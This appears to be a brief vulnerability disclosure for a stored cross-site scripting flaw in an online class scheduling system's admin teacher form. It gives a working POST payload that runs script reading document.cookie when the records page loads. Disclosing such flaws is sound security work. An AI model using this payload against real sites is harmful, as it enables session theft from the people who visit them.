BUG_Author: CLJY

Vulnerability File: /online_class_scheduling_system/admin/save_teacher.php

POST parameter "Academic_Rank" exists stored cross-site scripting vulnerability

Payload: Name=1&Academic_Rank=<script>alert(document.cookie)</script>&Designation=2&Department=College+of+Education&save=

![image](https://github.com/jiy2020/bugReport/blob/main/xss.png)

Payload will trigger when a user visits on http://localhost/online_class_scheduling_system/admin/record.php

![image](https://github.com/jiy2020/bugReport/blob/main/xss1.png)
